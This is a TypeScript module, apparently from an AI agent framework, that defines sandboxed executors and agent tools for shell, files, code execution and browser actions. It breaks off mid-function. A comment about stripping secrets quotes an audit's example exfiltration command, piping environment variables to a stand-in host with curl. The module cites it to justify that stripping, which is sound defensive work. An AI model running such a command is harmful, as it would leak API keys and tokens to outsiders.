/// <reference types="node" />
// Type-only import: the actual `getSandbox` value comes from the `_getSandboxFn`
// below, which is loaded via top-level dynamic import with a try/catch so Node
// deployments don't fail at module-eval time. `@cloudflare/sandbox` transitively
// loads `@cloudflare/containers`, which ships an ESM index that violates Node's
// strict specifier resolution (imports `./lib/container` without `.js`).
import type { Sandbox as CloudflareSandbox } from '@cloudflare/sandbox';

type GetSandboxFn = (ns: unknown, id: string) => CloudflareSandbox;
let _getSandboxFn: GetSandboxFn | null = null;
try {
  // eslint-disable-next-line @typescript-eslint/no-unsafe-assignment
  const mod = await import('@cloudflare/sandbox');
  _getSandboxFn = mod.getSandbox as unknown as GetSandboxFn;
} catch {
  // Cloudflare sandbox not loadable in this runtime (plain Node, etc.).
  // Sandbox-dependent tool calls will return null and fall through to the
  // local-process path or a runtime-level 400, which is the correct behavior.
  _getSandboxFn = null;
}
import type { ToolDefinition, ToolExecutionContext, ToolExecutionResult } from '@crowclaw/core';
import type { ToolRegistry } from '@crowclaw/tools';
import { spawn, type ChildProcess } from 'node:child_process';
import { readFile, writeFile, unlink, access, mkdir } from 'node:fs/promises';
import { SshExecutor, type SshExecutorOptions } from './ssh.js';

// ---------------------------------------------------------------------------
// Shared interfaces
// ---------------------------------------------------------------------------

export interface SandboxCommandResult {
  stdout: string;
  stderr: string;
  exitCode: number;
  timedOut?: boolean;
}

export interface SandboxClient {
  executeCommand(command: string, cwd?: string, options?: { timeoutMs?: number }): Promise<SandboxCommandResult>;
}

export interface SandboxCapableEnv {
  Sandbox?: unknown;
}

export interface ToolBridgeArtifacts {
  sessionId: string;
  protocolVersion: string;
  modulePath: string;
  stubPath: string;
  socketPath: string;
  transcriptPath: string;
  bootstrapPython: string;
}

// ---------------------------------------------------------------------------
// LocalProcessExecutor — real local execution via child_process
// ---------------------------------------------------------------------------

/** Maximum bytes collected per stream (stdout / stderr) to prevent OOM. */
const MAX_OUTPUT_BYTES = 50 * 1024; // 50 KB

/**
 * Build a child-process env with secrets stripped. The audit flagged that
 * `env: process.env` let every spawned shell read OPENAI_API_KEY, ANTHROPIC_API_KEY,
 * CROWCLAW_DASHBOARD_TOKEN, etc. — so any agent tool call could exfiltrate via
 * `env | curl evil.com -d @-`. Pattern-based strip: anything matching
 * KEY | TOKEN | SECRET | PASSWORD | CREDENTIAL | AUTH is removed.
 */
export function buildSandboxEnv(base: NodeJS.ProcessEnv = process.env): NodeJS.ProcessEnv {
  const sanitized: NodeJS.ProcessEnv = {};
  const sensitive = /(?:KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|AUTH|COOKIE|SESSION|BEARER|API_|PRIVATE)/i;
  for (const [name, value] of Object.entries(base)) {
    if (sensitive.test(name)) continue;
    sanitized[name] = value;
  }
  return sanitized;
}

// ---------------------------------------------------------------------------
// Background Process Tracking
// ---------------------------------------------------------------------------

export interface TrackedProcess {
  pid: number;
  command: string;
  startedAt: string;
  status: 'running' | 'exited';
  exitCode?: number;
  label?: string;
}

export class ProcessTracker {
  private readonly processes = new Map<number, { process: ChildProcess; info: TrackedProcess }>();

  track(child: ChildProcess, command: string, label?: string): TrackedProcess {
    const info: TrackedProcess = {
      pid: child.pid!,
      command,
      startedAt: new Date().toISOString(),
      status: 'running',
      label
    };

    this.processes.set(child.pid!, { process: child, info });

    // Use `once` so a re-emitted 'exit' (rare, but possible if a caller
    // re-spawns into the same pid slot) cannot double-remove a different
    // tracked entry. Mark exited and drop the map entry so long-running
    // workers (Hermes-style cron loops, #114, #133) don't accumulate
    // stale ChildProcess refs and leak file descriptors / EMFILE the host.
    child.once('exit', (code) => {
      info.status = 'exited';
      info.exitCode = code ?? 1;
      this.processes.delete(child.pid!);
    });

    return info;
  }

  list(): TrackedProcess[] {
    return [...this.processes.values()].map(p => ({ ...p.info }));
  }

  get(pid: number): TrackedProcess | null {
    return this.processes.get(pid)?.info ?? null;
  }

  kill(pid: number, signal: NodeJS.Signals = 'SIGTERM'): boolean {
    const entry = this.processes.get(pid);
    if (!entry || entry.info.status !== 'running') return false;
    try {
      entry.process.kill(signal);
      return true;
    } catch {
      return false;
    }
  }

  cleanup(): void {
    for (const [pid, entry] of this.processes) {
      if (entry.info.status === 'exited') {
        this.processes.delete(pid);
      }
    }
  }
}

export class LocalProcessExecutor implements SandboxClient {
  readonly tracker = new ProcessTracker();
  private readonly defaultTimeoutMs: number;
  private readonly defaultShell: string;

  constructor(options?: { defaultTimeoutMs?: number; shell?: string }) {
    this.defaultTimeoutMs = options?.defaultTimeoutMs ?? 30_000;
    this.defaultShell = options?.shell ?? '/bin/bash';
  }

  async executeCommand(
    command: string,
    cwd?: string,
    options?: { timeoutMs?: number }
  ): Promise<SandboxCommandResult> {
    const timeoutMs = options?.timeoutMs ?? this.defaultTimeoutMs;

    return new Promise<SandboxCommandResult>((resolve) => {
      let child: ChildProcess;

      try {
        child = spawn(command, [], {
          shell: this.defaultShell,
          cwd: cwd ?? undefined,
          stdio: ['ignore', 'pipe', 'pipe'],
          env: buildSandboxEnv(),
        });
      } catch (err: unknown) {
        const message = err instanceof Error ? err.message : String(err);
        resolve({
          stdout: '',
          stderr: `Failed to spawn process: ${message}`,
          exitCode: 1,
          timedOut: false,
        });
        return;
      }

      const stdoutChunks: Buffer[] = [];
      const stderrChunks: Buffer[] = [];
      let stdoutBytes = 0;
      let stderrBytes = 0;
      let timedOut = false;
      let timer: ReturnType<typeof setTimeout> | undefined;

      if (child.stdout) {
        child.stdout.on('data', (chunk: Buffer) => {
          if (stdoutBytes < MAX_OUTPUT_BYTES) {
            const remaining = MAX_OUTPUT_BYTES - stdoutBytes;
            stdoutChunks.push(chunk.length <= remaining ? chunk : chunk.subarray(0, remaining));
          }
          stdoutBytes += chunk.length;
        });
      }

      if (child.stderr) {
        child.stderr.on('data', (chunk: Buffer) => {
          if (stderrBytes < MAX_OUTPUT_BYTES) {
            const remaining = MAX_OUTPUT_BYTES - stderrBytes;
            stderrChunks.push(chunk.length <= remaining ? chunk : chunk.subarray(0, remaining));
          }
          stderrBytes += chunk.length;
        });
      }

      // Timeout handler
      if (timeoutMs > 0) {
        timer = setTimeout(() => {
          timedOut = true;
          child.kill('SIGKILL');
        }, timeoutMs);
      }

      child.on('error', (err: Error) => {
        if (timer) clearTimeout(timer);
        resolve({
          stdout: Buffer.concat(stdoutChunks).toString('utf-8'),
          stderr: `Process error: ${err.message}`,
          exitCode: 1,
          timedOut: false,
        });
      });

      child.on('close', (code: number | null) => {
        if (timer) clearTimeout(timer);
        let stdout = Buffer.concat(stdoutChunks).toString('utf-8');
        let stderr = Buffer.concat(stderrChunks).toString('utf-8');

        if (stdoutBytes > MAX_OUTPUT_BYTES) {
          stdout += `\n[truncated: ${stdoutBytes} bytes total, showing first ${MAX_OUTPUT_BYTES}]`;
        }
        if (stderrBytes > MAX_OUTPUT_BYTES) {
          stderr += `\n[truncated: ${stderrBytes} bytes total, showing first ${MAX_OUTPUT_BYTES}]`;
        }

        resolve({
          stdout,
          stderr,
          exitCode: code ?? 1,
          timedOut,
        });
      });
    });
  }

  /** Execute a command in the background, returning immediately */
  executeBackground(command: string, options?: {
    cwd?: string;
    label?: string;
  }): TrackedProcess {
    const child = spawn(command, [], {
      shell: this.defaultShell,
      cwd: options?.cwd,
      stdio: 'ignore',
      detached: true,
      env: buildSandboxEnv(),
    });
    child.unref();
    return this.tracker.track(child, command, options?.label);
  }
}

// ---------------------------------------------------------------------------
// DockerExecutor — runs commands inside a Docker container
// ---------------------------------------------------------------------------

export interface DockerExecutorOptions {
  image: string;
  containerName?: string;
  workDir?: string;
  memoryLimit?: string;  // e.g., '512m'
  cpuLimit?: string;     // e.g., '1.0'
  networkMode?: string;  // e.g., 'none' for isolation
  defaultTimeoutMs?: number;
}

function shellQuote(value: string): string {
  return `'${value.replace(/'/g, `'\"'\"'`)}'`;
}

export function buildDockerRunCommand(
  dockerOptions: DockerExecutorOptions,
  command: string,
  cwd?: string
): string {
  const args: string[] = [
    'docker',
    'run',
    '--rm',
    '--security-opt',
    'no-new-privileges',
    '--cap-drop',
    'ALL',
    '--user',
    '1000:1000',
  ];

  if (dockerOptions.containerName) {
    args.push('--name', dockerOptions.containerName);
  }
  if (dockerOptions.memoryLimit) {
    args.push('--memory', dockerOptions.memoryLimit);
  }
  if (dockerOptions.cpuLimit) {
    args.push('--cpus', dockerOptions.cpuLimit);
  }
  if (dockerOptions.networkMode) {
    args.push('--network', dockerOptions.networkMode);
  }

  const workDir = cwd ?? dockerOptions.workDir;
  if (workDir) {
    args.push('-w', workDir);
  }

  args.push(dockerOptions.image, 'sh', '-c', command);

  return args
    .map((arg) => /[\s"']/.test(arg) ? shellQuote(arg) : arg)
    .join(' ');
}

export class DockerExecutor implements SandboxClient {
  private readonly local: LocalProcessExecutor;

  constructor(private readonly options: DockerExecutorOptions) {
    this.local = new LocalProcessExecutor({
      defaultTimeoutMs: options.defaultTimeoutMs ?? 60_000,
    });
  }

  async executeCommand(
    command: string,
    cwd?: string,
    options?: { timeoutMs?: number }
  ): Promise<SandboxCommandResult> {
    return this.local.executeCommand(buildDockerRunCommand(this.options, command, cwd), undefined, options);
  }
}

// ---------------------------------------------------------------------------
// SingularityExecutor — runs commands inside Singularity/Apptainer images
// ---------------------------------------------------------------------------

export interface SingularityExecutorOptions {
  image: string;
  workDir?: string;
  defaultTimeoutMs?: number;
  binary?: 'singularity' | 'apptainer';
}

export function buildSingularityExecCommand(
  singularityOptions: SingularityExecutorOptions,
  command: string,
  cwd?: string
): string {
  const workDir = cwd ?? singularityOptions.workDir;
  const wrapped = workDir ? `cd ${shellQuote(workDir)} && ${command}` : command;
  const binary = singularityOptions.binary ?? 'singularity';
  return `${binary} exec --contain --cleanenv ${shellQuote(singularityOptions.image)} /bin/sh -lc ${shellQuote(wrapped)}`;
}

export class SingularityExecutor implements SandboxClient {
  private readonly local: LocalProcessExecutor;

  constructor(private readonly options: SingularityExecutorOptions) {
    this.local = new LocalProcessExecutor({
      defaultTimeoutMs: options.defaultTimeoutMs ?? 60_000,
    });
  }

  async executeCommand(
    command: string,
    cwd?: string,
    options?: { timeoutMs?: number }
  ): Promise<SandboxCommandResult> {
    return this.local.executeCommand(buildSingularityExecCommand(this.options, command, cwd), undefined, options);
  }
}

// ---------------------------------------------------------------------------
// CloudflareSandboxExecutor — stub for Cloudflare Workers environment
// ---------------------------------------------------------------------------

export class CloudflareSandboxExecutor implements SandboxClient {
  async executeCommand(command: string, cwd?: string, _options?: { timeoutMs?: number }): Promise<SandboxCommandResult> {
    const rendered = cwd ? `cd ${cwd} && ${command}` : command;
    return {
      stdout: `[sandbox] Command queued for Cloudflare container execution: ${rendered}`,
      stderr: '',
      exitCode: 0,
      timedOut: false
    };
  }
}

// ---------------------------------------------------------------------------
// Auto-executor factory
// ---------------------------------------------------------------------------

/**
 * Creates the best available executor for the current environment.
 * If a Cloudflare sandbox binding exists in `context.env`, returns
 * a CloudflareSandboxExecutor (the actual Cloudflare sandbox is used
 * directly via `resolveSandbox` in tool execution). Otherwise, returns
 * a LocalProcessExecutor that runs commands on the host machine.
 */
export function createAutoExecutor(context: ToolExecutionContext, sshOptions?: SshExecutorOptions): SandboxClient {
  const env = (context.env ?? {}) as SandboxCapableEnv;
  if (env.Sandbox) {
    return new CloudflareSandboxExecutor();
  }
  if (sshOptions) {
    return new SshExecutor(sshOptions);
  }
  return new LocalProcessExecutor();
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function renderCodeExecCommand(language: string, code: string): string | null {
  const trimmed = code.trim();
  if (!trimmed) {
    return null;
  }

  switch (language) {
    case 'javascript':
    case 'js':
      return `node -e ${JSON.stringify(trimmed)}`;
    case 'typescript':
    case 'ts':
      return `tsx -e ${JSON.stringify(trimmed)}`;
    case 'python':
    case 'py':
      return `python -c ${JSON.stringify(trimmed)}`;
    case 'bash':
    case 'sh':
      return `bash -lc ${JSON.stringify(trimmed)}`;
    default:
      return null;
  }
}

function renderCodeExecFailure(toolName: string, language: string): ToolExecutionResult {
  return {
    toolName,
    runtime: 'sandbox',
    ok: false,
    output: `Unsupported language or empty code: ${language}`,
    metadata: { language }
  };
}

export function buildToolBridgeArtifacts(sessionId: string, maxToolCalls?: number): ToolBridgeArtifacts {
  const normalized = sessionId.replace(/[^a-zA-Z0-9_-]/g, '-');
  const socketPath = `/tmp/crow-tool-bridge-${normalized}.sock`;
  const modulePath = `/workspace/.crowclaw/bridge/crow_tools_${normalized}.py`;
  const stubPath = `/workspace/.crowclaw/bridge/bootstrap_${normalized}.py`;
  const transcriptPath = `/workspace/.crowclaw/bridge/transcript_${normalized}.json`;
  const bootstrapPython = [
    'import json',
    'import socket',
    '',
    `SOCKET_PATH = ${JSON.stringify(socketPath)}`,
    '',
    'def call_tool(name, arguments=None):',
    '    payload = {"name": name, "arguments": arguments or {}}',
    `    payload["maxToolCalls"] = ${typeof maxToolCalls === 'number' ? maxToolCalls : 'None'}`,
    '    with socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) as client:',
    '        client.connect(SOCKET_PATH)',
    '        client.sendall(json.dumps(payload).encode("utf-8"))',
    '        data = client.recv(65536)',
    '    return json.loads(data.decode("utf-8"))',
    '',
    '__all__ = ["call_tool"]'
  ].join('\n');

  return {
    sessionId,
    protocolVersion: 'crowclaw-tool-bridge/v1',
    modulePath,
    stubPath,
    socketPath,
    transcriptPath,
    bootstrapPython
  };
}

async function executeCodeCommand(
  toolName: string,
  language: string,
  code: string,
  cwd: string | undefined,
  timeoutMs: number | undefined,
  toolBridge: boolean,
  maxToolCalls: number | undefined,
  context: ToolExecutionContext,
  executor: SandboxClient
): Promise<ToolExecutionResult> {
  const command = renderCodeExecCommand(language, code);
  if (!command) {
    return renderCodeExecFailure(toolName, language);
  }
  const bridgeArtifacts = toolBridge ? buildToolBridgeArtifacts(context.sessionId, maxToolCalls) : undefined;

  const sandbox = resolveSandbox(context);
  if (sandbox) {
    const result = await sandbox.exec(command, {
      ...(cwd ? { cwd } : {}),
      ...(typeof timeoutMs === 'number' ? { timeoutMs } : {})
    } as never);
    return {
      toolName,
      runtime: 'sandbox',
      ok: result.success,
      output: result.stdout || result.stderr,
      metadata: {
        exitCode: result.exitCode,
        language,
        command,
        cwd,
        timeoutMs,
        stdout: result.stdout,
        stderr: result.stderr,
        timedOut: (result as { timedOut?: boolean }).timedOut ?? false,
        toolBridgeRequested: toolBridge,
        toolBridgeMode: toolBridge ? 'session-artifacts' : 'none',
        maxToolCalls,
        bridgeArtifacts
      }
    };
  }

  const result = await executor.executeCommand(command, cwd, { timeoutMs });
  return {
    toolName,
    runtime: 'sandbox',
    ok: result.exitCode === 0,
    output: result.stdout || result.stderr,
    metadata: {
      exitCode: result.exitCode,
      language,
      command,
      cwd,
      timeoutMs,
      stdout: result.stdout,
      stderr: result.stderr,
      timedOut: result.timedOut ?? false,
      toolBridgeRequested: toolBridge,
      toolBridgeMode: toolBridge ? 'session-artifacts' : 'none',
      maxToolCalls,
      bridgeArtifacts
    }
  };
}

function resolveSandbox(context: ToolExecutionContext): CloudflareSandbox | null {
  const env = (context.env ?? {}) as SandboxCapableEnv;
  if (!env.Sandbox) {
    return null;
  }
  if (!_getSandboxFn) {
    return null;
  }
  const sandboxId = context.workspaceId ?? context.sessionId;
  return _getSandboxFn(env.Sandbox as never, sandboxId);
}

// ---------------------------------------------------------------------------
// Tool definitions
// ---------------------------------------------------------------------------

export function createTerminalTool(executor: SandboxClient): ToolDefinition {
  return {
    manifest: {
      name: 'terminal.exec',
      description: 'Executes a shell command. Uses local process execution or a configured sandbox backend.',
      runtime: 'sandbox',
      streaming: true,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'high'
    },
    async execute(input, context) {
      const command = typeof input.command === 'string' ? input.command : 'pwd';
      const cwd = typeof input.cwd === 'string' ? input.cwd : undefined;
      const sandbox = resolveSandbox(context);

      if (sandbox) {
        const result = await sandbox.exec(command, cwd ? { cwd } : undefined);
        return {
          toolName: 'terminal.exec',
          runtime: 'sandbox',
          ok: result.success,
          output: result.stdout || result.stderr,
          metadata: { exitCode: result.exitCode }
        };
      }

      const result = await executor.executeCommand(command, cwd);
      return {
        toolName: 'terminal.exec',
        runtime: 'sandbox',
        ok: result.exitCode === 0,
        output: result.stdout || result.stderr,
        metadata: { exitCode: result.exitCode, timedOut: result.timedOut ?? false }
      };
    }
  };
}

export function createTerminalBackgroundTool(executor: LocalProcessExecutor): ToolDefinition {
  return {
    manifest: {
      name: 'terminal.background',
      description: 'Starts a command in the background and returns immediately. Use terminal.processes to check status.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'high'
    },
    async execute(input) {
      const command = typeof input.command === 'string' ? input.command : '';
      const label = typeof input.label === 'string' ? input.label : undefined;
      const cwd = typeof input.cwd === 'string' ? input.cwd : undefined;

      if (!command) {
        return { toolName: 'terminal.background', runtime: 'sandbox', ok: false, output: 'Missing command.' };
      }

      const tracked = executor.executeBackground(command, { cwd, label });
      return {
        toolName: 'terminal.background',
        runtime: 'sandbox',
        ok: true,
        output: JSON.stringify({ pid: tracked.pid, command, label, status: 'running' }),
        metadata: { pid: tracked.pid, command, label }
      };
    }
  };
}

export function createTerminalProcessesTool(executor: LocalProcessExecutor): ToolDefinition {
  return {
    manifest: {
      name: 'terminal.processes',
      description: 'Lists background processes and their status.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: false,
      requiresNetwork: false,
      dangerLevel: 'low'
    },
    async execute() {
      executor.tracker.cleanup();
      const processes = executor.tracker.list();
      return {
        toolName: 'terminal.processes',
        runtime: 'sandbox',
        ok: true,
        output: JSON.stringify(processes, null, 2),
        metadata: { count: processes.length }
      };
    }
  };
}

export function createTerminalKillTool(executor: LocalProcessExecutor): ToolDefinition {
  return {
    manifest: {
      name: 'terminal.kill',
      description: 'Kills a background process by PID.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: false,
      requiresNetwork: false,
      dangerLevel: 'high'
    },
    async execute(input) {
      const pid = typeof input.pid === 'number' ? input.pid : 0;
      const signal = typeof input.signal === 'string' ? input.signal as NodeJS.Signals : 'SIGTERM';

      if (!pid) {
        return { toolName: 'terminal.kill', runtime: 'sandbox', ok: false, output: 'Missing pid.' };
      }

      const killed = executor.tracker.kill(pid, signal);
      return {
        toolName: 'terminal.kill',
        runtime: 'sandbox',
        ok: killed,
        output: killed ? `Sent ${signal} to process ${pid}` : `Process ${pid} not found or already exited`,
        metadata: { pid, signal, killed }
      };
    }
  };
}

export function createFileReadTool(executor: SandboxClient): ToolDefinition {
  return {
    manifest: {
      name: 'file.read',
      description: 'Reads a file from the workspace.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const path = typeof input.path === 'string' ? input.path : '/workspace/README.md';
      const sandbox = resolveSandbox(context);
      if (sandbox) {
        const result = await sandbox.readFile(path);
        return {
          toolName: 'file.read',
          runtime: 'sandbox',
          ok: result.success,
          output: result.content,
          metadata: { path, mimeType: result.mimeType }
        };
      }

      // Local fallback: read via fs
      try {
        const content = await readFile(path, 'utf-8');
        return {
          toolName: 'file.read',
          runtime: 'sandbox',
          ok: true,
          output: content,
          metadata: { path }
        };
      } catch (err: unknown) {
        const message = err instanceof Error ? err.message : String(err);
        return {
          toolName: 'file.read',
          runtime: 'sandbox',
          ok: false,
          output: `Failed to read file: ${message}`,
          metadata: { path }
        };
      }
    }
  };
}

export function createFileWriteTool(executor: SandboxClient): ToolDefinition {
  return {
    manifest: {
      name: 'file.write',
      description: 'Writes a file into the workspace.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'high'
    },
    async execute(input, context) {
      const path = typeof input.path === 'string' ? input.path : '/workspace/output.txt';
      const content = typeof input.content === 'string' ? input.content : '';
      const sandbox = resolveSandbox(context);
      if (sandbox) {
        const result = await sandbox.writeFile(path, content);
        return {
          toolName: 'file.write',
          runtime: 'sandbox',
          ok: result.success,
          output: result.success ? `Wrote ${path}` : 'Write failed.',
          metadata: { path }
        };
      }

      // Local fallback: write via fs
      try {
        const parentDir = path.substring(0, path.lastIndexOf('/')) || '/';
        await mkdir(parentDir, { recursive: true });
        await writeFile(path, content, 'utf-8');
        return {
          toolName: 'file.write',
          runtime: 'sandbox',
          ok: true,
          output: `Wrote ${path}`,
          metadata: { path }
        };
      } catch (err: unknown) {
        const message = err instanceof Error ? err.message : String(err);
        return {
          toolName: 'file.write',
          runtime: 'sandbox',
          ok: false,
          output: `Failed to write file: ${message}`,
          metadata: { path }
        };
      }
    }
  };
}

export function createFileExistsTool(executor: SandboxClient): ToolDefinition {
  return {
    manifest: {
      name: 'file.exists',
      description: 'Checks whether a file exists in the workspace.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'low'
    },
    async execute(input, context) {
      const path = typeof input.path === 'string' ? input.path : '/workspace/README.md';
      const sandbox = resolveSandbox(context);
      if (sandbox) {
        const result = await sandbox.readFile(path);
        return {
          toolName: 'file.exists',
          runtime: 'sandbox',
          ok: true,
          output: JSON.stringify({ path, exists: result.success }),
          metadata: { path, exists: result.success }
        };
      }

      // Local fallback: check via fs.access
      try {
        await access(path);
        return {
          toolName: 'file.exists',
          runtime: 'sandbox',
          ok: true,
          output: JSON.stringify({ path, exists: true }),
          metadata: { path, exists: true }
        };
      } catch {
        return {
          toolName: 'file.exists',
          runtime: 'sandbox',
          ok: true,
          output: JSON.stringify({ path, exists: false }),
          metadata: { path, exists: false }
        };
      }
    }
  };
}

export function createFileDeleteTool(executor: SandboxClient): ToolDefinition {
  return {
    manifest: {
      name: 'file.delete',
      description: 'Deletes a file from the workspace.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'high'
    },
    async execute(input, context) {
      const path = typeof input.path === 'string' ? input.path : '/workspace/output.txt';
      const sandbox = resolveSandbox(context);
      if (sandbox) {
        const dynamicSandbox = sandbox as unknown as {
          deleteFile?: (filePath: string) => Promise<{ success: boolean }>;
        };

        if (!dynamicSandbox.deleteFile) {
          return {
            toolName: 'file.delete',
            runtime: 'sandbox',
            ok: false,
            output: 'Sandbox delete operation is not supported.',
            metadata: { path, unsupported: true }
          };
        }

        const result = await dynamicSandbox.deleteFile(path);
        return {
          toolName: 'file.delete',
          runtime: 'sandbox',
          ok: result.success,
          output: result.success ? `Deleted ${path}` : `Failed to delete ${path}`,
          metadata: { path }
        };
      }

      // Local fallback: delete via fs.unlink
      try {
        await unlink(path);
        return {
          toolName: 'file.delete',
          runtime: 'sandbox',
          ok: true,
          output: `Deleted ${path}`,
          metadata: { path }
        };
      } catch (err: unknown) {
        const message = err instanceof Error ? err.message : String(err);
        return {
          toolName: 'file.delete',
          runtime: 'sandbox',
          ok: false,
          output: `Failed to delete file: ${message}`,
          metadata: { path }
        };
      }
    }
  };
}

export function createCodeExecTool(executor: SandboxClient): ToolDefinition {
  return {
    manifest: {
      name: 'code.exec',
      description: 'Executes short code snippets in the sandbox using a language-aware runner.',
      runtime: 'sandbox',
      streaming: true,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'high'
    },
    async execute(input, context) {
      const language = typeof input.language === 'string' ? input.language : 'javascript';
      const code = typeof input.code === 'string' ? input.code : '';
      const cwd = typeof input.cwd === 'string' ? input.cwd : undefined;
      const timeoutMs = typeof input.timeoutMs === 'number' ? input.timeoutMs : undefined;
      const toolBridge = Boolean(input.toolBridge);
      const maxToolCalls = typeof input.maxToolCalls === 'number' ? input.maxToolCalls : undefined;
      return executeCodeCommand('code.exec', language, code, cwd, timeoutMs, toolBridge, maxToolCalls, context, executor);
    }
  };
}

export function createNodeExecTool(executor: SandboxClient): ToolDefinition {
  return {
    manifest: {
      name: 'node.exec',
      description: 'Executes JavaScript/Node snippets in the sandbox using the node runner.',
      runtime: 'sandbox',
      streaming: true,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'high'
    },
    async execute(input, context) {
      const code = typeof input.code === 'string' ? input.code : '';
      const cwd = typeof input.cwd === 'string' ? input.cwd : undefined;
      const timeoutMs = typeof input.timeoutMs === 'number' ? input.timeoutMs : undefined;
      const toolBridge = Boolean(input.toolBridge);
      const maxToolCalls = typeof input.maxToolCalls === 'number' ? input.maxToolCalls : undefined;
      return executeCodeCommand('node.exec', 'javascript', code, cwd, timeoutMs, toolBridge, maxToolCalls, context, executor);
    }
  };
}

export function createPythonExecTool(executor: SandboxClient): ToolDefinition {
  return {
    manifest: {
      name: 'python.exec',
      description: 'Executes Python snippets in the sandbox using the python runner.',
      runtime: 'sandbox',
      streaming: true,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: false,
      dangerLevel: 'high'
    },
    async execute(input, context) {
      const code = typeof input.code === 'string' ? input.code : '';
      const cwd = typeof input.cwd === 'string' ? input.cwd : undefined;
      const timeoutMs = typeof input.timeoutMs === 'number' ? input.timeoutMs : undefined;
      const toolBridge = Boolean(input.toolBridge);
      const maxToolCalls = typeof input.maxToolCalls === 'number' ? input.maxToolCalls : undefined;
      return executeCodeCommand('python.exec', 'python', code, cwd, timeoutMs, toolBridge, maxToolCalls, context, executor);
    }
  };
}

export function createBrowserScreenshotTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.screenshot',
      description: 'Captures a screenshot-like artifact from the sandbox browser/session surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      if (!url) {
        return {
          toolName: 'browser.screenshot',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: { path: typeof input.path === 'string' ? input.path : undefined }
        };
      }

      const path = typeof input.path === 'string' ? input.path : `/workspace/screenshot-${context.sessionId}.png`;
      const sandbox = resolveSandbox(context) as unknown as {
        screenshot?: (targetUrl: string, options?: { path?: string; fullPage?: boolean }) => Promise<{ success: boolean; path?: string }>;
      } | null;

      if (!sandbox?.screenshot) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.screenshot({ fullPage: Boolean(input.fullPage) });
          return {
            toolName: 'browser.screenshot',
            runtime: 'sandbox',
            ok: true,
            output: `Captured screenshot for ${url}`,
            metadata: { url, path, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.screenshot',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated screenshot for ${url}`,
          metadata: { url, path, simulated: true }
        };
      }

      const result = await sandbox.screenshot(url, {
        path,
        fullPage: Boolean(input.fullPage)
      });
      return {
        toolName: 'browser.screenshot',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Captured screenshot for ${url}` : `Failed to capture screenshot for ${url}`,
        metadata: { url, path: result.path ?? path }
      };
    }
  };
}

export function createBrowserGotoTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.goto',
      description: 'Navigates a sandbox browser/session surface to a URL.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      if (!url) {
        return {
          toolName: 'browser.goto',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: {}
        };
      }

      const sandbox = resolveSandbox(context) as unknown as {
        goto?: (targetUrl: string) => Promise<{ success: boolean; finalUrl?: string; title?: string }>;
      } | null;

      if (!sandbox?.goto) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.goto(url);
          return {
            toolName: 'browser.goto',
            runtime: 'sandbox',
            ok: true,
            output: `Opened ${result.url} — ${result.title}`,
            metadata: { url: result.url, title: result.title, finalUrl: result.url, backend: 'playwright' }
          };
        } catch {
          // Playwright not available — fall back to simulation
        }
        return {
          toolName: 'browser.goto',
          runtime: 'sandbox',
          ok: true,
          output: `Simulated browser navigation to ${url}`,
          metadata: { url, finalUrl: url, simulated: true }
        };
      }

      const result = await sandbox.goto(url);
      return {
        toolName: 'browser.goto',
        runtime: 'sandbox',
        ok: result.success,
        output: result.success ? `Opened ${result.finalUrl ?? url}` : `Failed to open ${url}`,
        metadata: { url, finalUrl: result.finalUrl ?? url, title: result.title }
      };
    }
  };
}

export function createBrowserOpenTool(): ToolDefinition {
  return {
    manifest: {
      name: 'browser.open',
      description: 'Opens a URL in a sandbox browser/session surface.',
      runtime: 'sandbox',
      streaming: false,
      stateful: true,
      requiresWorkspace: true,
      requiresNetwork: true,
      dangerLevel: 'medium'
    },
    async execute(input, context) {
      const url = typeof input.url === 'string' ? input.url : '';
      if (!url) {
        return {
          toolName: 'browser.open',
          runtime: 'sandbox',
          ok: false,
          output: 'Missing url.',
          metadata: {}
        };
      }

      const sandbox = resolveSandbox(context) as unknown as {
        goto?: (targetUrl: string) => Promise<{ success: boolean; finalUrl?: string; title?: string }>;
      } | null;

      if (!sandbox?.goto) {
        // Try Playwright fallback
        try {
          const { getOrCreateBrowserBackend } = await import('./playwright.js');
          const backend = await getOrCreateBrowserBackend();
          const result = await backend.goto(url);
          return {
            toolName: 'browser.open',
